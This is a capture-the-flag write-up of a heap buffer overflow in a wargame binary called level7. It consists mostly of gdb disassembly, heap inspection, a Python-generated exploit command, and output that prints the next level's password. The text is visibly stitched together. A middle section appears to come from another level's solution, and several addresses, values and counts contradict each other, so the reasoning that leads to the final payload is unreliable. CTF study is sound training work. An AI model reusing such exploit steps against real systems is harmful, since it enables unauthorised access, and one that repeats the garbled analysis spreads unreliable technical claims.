# level7 - Heap Buffer Overflow

On `level7`'s HOME, we find a binary named : `level7`

```shell
...
0x080484f4  m
0x08048521  main
...
```

We find three interesting functions in this binary : `main()`, `m()`.
let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x08048521 <+0>:	push   ebp
   0x08048522 <+1>:	mov    ebp,esp
   0x08048524 <+3>:	and    esp,0xfffffff0
   0x08048527 <+6>:	sub    esp,0x20
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:	add    eax,0x4
   0x0804858e <+109>:	mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:	mov    edx,eax
   0x08048592 <+113>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:	mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:	mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:	mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:	add    eax,0x8
   0x080485ab <+138>:	mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:	mov    edx,eax
   0x080485af <+142>:	mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:	mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:	mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:	mov    DWORD PTR [esp],eax
   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
   0x080485fc <+219>:	mov    eax,0x0
   0x08048601 <+224>:	leave
   0x08048602 <+225>:	ret
End of assembler dump.
(gdb)  disass m
Dump of assembler code for function m:
   0x080484f4 <+0>:	push   ebp
   0x080484f5 <+1>:	mov    ebp,esp
   0x080484f7 <+3>:	sub    esp,0x18
   0x080484fa <+6>:	mov    DWORD PTR [esp],0x0
   0x08048501 <+13>:	call   0x80483d0 <time@plt>
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
   0x0804851f <+43>:	leave
   0x08048520 <+44>:	ret
End of assembler dump.
```

<br>

We can see that to exploit this binary, we must find a way to jump to the
function `m()` which reads the `.pass` file of next level reading by `fgets()`
in `main()` function and stores on pointeur **0x8049960**

```shell
(gdb) disass main
...
   0x080485c2 <+161>:	mov    edx,0x80486e9
   0x080485c7 <+166>:	mov    eax,0x80486eb
   0x080485cc <+171>:	mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:	mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:	mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:	mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:	mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:	mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
...
(gdb) disass m
...
   0x08048506 <+18>:	mov    edx,0x80486e0
   0x0804850b <+23>:	mov    DWORD PTR [esp+0x8],eax
   0x0804850f <+27>:	mov    DWORD PTR [esp+0x4],0x8049960
   0x08048517 <+35>:	mov    DWORD PTR [esp],edx
   0x0804851a <+38>:	call   0x80483b0 <printf@plt>
...
(gdb)  x/s 0x80486e9
0x80486e9:	"r"
(gdb)  x/s 0x80486eb
0x80486eb:	"/home/user/level8/.pass"
```

<br>

To do this, let's understand in more depth what is happening in the `main()` function.

The first information we have is in this snippet:

```shell
...
   0x0804852a <+9>:	mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:	mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:	mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:	mov    edx,eax
   0x08048552 <+49>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:	mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:	mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:	mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:	mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:	mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:	mov    edx,eax
   0x08048581 <+96>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:	mov    DWORD PTR [eax+0x4],edx
...
```

So, four **8 bytes** memory spaces are allocate in the heap. Let's break using
gdb after each `malloc()` to find the addresses location in the heap.

```shell
(gdb) b *0x08048536
Breakpoint 1 at 0x8048536
(gdb) b *0x08048550
Breakpoint 2 at 0x8048550
(gdb) b *0x08048565
Breakpoint 3 at 0x8048565
(gdb) b *0x0804857f
Breakpoint 4 at 0x804857f
(gdb) r
Starting program: /home/user/level7/level7

Breakpoint 1, 0x08048536 in main ()
(gdb) x/x $eax
0x804a008:	0x00000000
(gdb) c
Continuing.

Breakpoint 2, 0x08048550 in main ()
(gdb) x/x $eax
0x804a018:	0x00000000
(gdb) c
Continuing.

Breakpoint 3, 0x08048565 in main ()
(gdb) x/x $eax
0x804a028:	0x00000000
(gdb) c
Continuing.

Breakpoint 4, 0x0804857f in main ()
(gdb) x/x $eax
0x804a038:	0x00000000
(gdb) x/x eax
```

Well, if we assembly code and break information, we can understand this mapping:

- First allocation:		**0x0804a008**
- Second allocation:	**0x0804a018**
- Third allocation:		**0x0804a028**
- Fourth allocation:	**0x0804a038**

and the second and fourth allocation are respectively behind pointers
**first_allocation+0x4** and **third_allocation+0x4**:

- (first)     **0x0804a008**: **0x2**
- (first+0x4) **0x0804a00c**: **0x0804a018**
- (third)     **0x0804a028**: **0x2**
- (third+0x4) **0x0804a02c**: **0x0804a038**




==================================================


 First alloc =>		8 bytes =>		0x0804a1a0 : 0x1 =>		esp+0x1c
									0x0804a1b0+0x04 : 0x0804a1b0

 Second alloc =>	8 bytes =>		0x0804a1b0: 0x0 =>		First+0x4

 Third alloc =>		8 bytes =>		0x0804a1c0:	0x2	=>		esp+0x18
									0x0804a1d0+0x04 : 0x0804a1d0

 Four alloc =>		8 bytes =>		0x0804a1d0: 0x0 =>		Third+0x4

 
 The first argument pass to the program is the source (strcpy())
 and take the address stores at **0x0804a1a0+0x4** as destination
 (strcpy())


The second argument pass to the program is the source (strcpy()) and
take the address stores at **0x0804a1c0+0x4** is passed as
destination (strcpy())






=====================================================

We can see that to exploit this binary, we must find a way to jump to the
function `n()` which read the `.pass` file of next level.

```shell
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```

<br>

To do this, let's understand in more depth what is happening in the `main()` function.

The first information we have is in this snippet:

```shell
   0x08048482 <+6>:	sub    esp,0x20
   0x08048485 <+9>:	mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:	mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    DWORD PTR [esp+0x18],eax
```

So, two memory space are allocate in the heap. One of **64** bytes (`esp+0x1c`)
and an other of **4** bytes (`esp+0x18`).

The second is concatenated to the first in the assembly code :

```shell
   0x080484a5 <+41>:	mov    edx,0x8048468
   0x080484aa <+46>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:	mov    DWORD PTR [eax],edx
```

This lead to give the address of `m()` function to the pointer allocated by
`malloc()` (`esp+0x18` -> **4 bytes**).

The third just after:
```shell
   0x080484b0 <+52>:	mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:	add    eax,0x4
   0x080484b6 <+58>:	mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:	mov    edx,eax
   0x080484ba <+62>:	mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:	mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:	mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
```

We understand that the first argument given to the program is given to `strcpy()`
as *source* argument, without any verification, and the fist memory space
allocated by `malloc()` (`esp+0x1c` -> **64 bytes**) as *destination* argument. 

And Finally, this snippet get us the context to exploit:

```shell
   0x080484ca <+78>:	mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:	mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:	call   eax
```

Simply, the address stores behind the second memory space allocated by `malloc()`
(`esp+0x18` -> **4 bytes**), which is the `m()` function address, is called.

It's a **Heap Buffer Overflow**.


<br>

So, to exploit this binary, we have to rewrite the address stored in the second
allocated memoty space. Lets's find the write offset we need:

```shell
(gdb) x/x $esp+0x1c
0xbffff71c:	0x08
(gdb) x/x *0xbffff71c
0x804a008:	0x00            => First allocation at 0x804a008
(gdb) x/x $esp+0x18
0xbffff718:	0x50
(gdb) x/x *0xbffff718
0x804a050:	0x00            => Second allocation at 0x804a050
```

So, we have an offset of **72 bytes** (*0x804a050 â€“ 0x804a008 = 0x48*) before
rewrite the pointer inside the second allocation. The target address is that of
the `n()` function: **0x08048454**


<br>

We can now exploit this BOF :

```shell
./level7 $(python -c 'print "A"*20 + "\xbf\xff\xf6\x3c"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
```

```shell
level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\xbf\xff\xf6\x3c"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')
~~
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1693403978
Segmentation fault (core dumped)
```
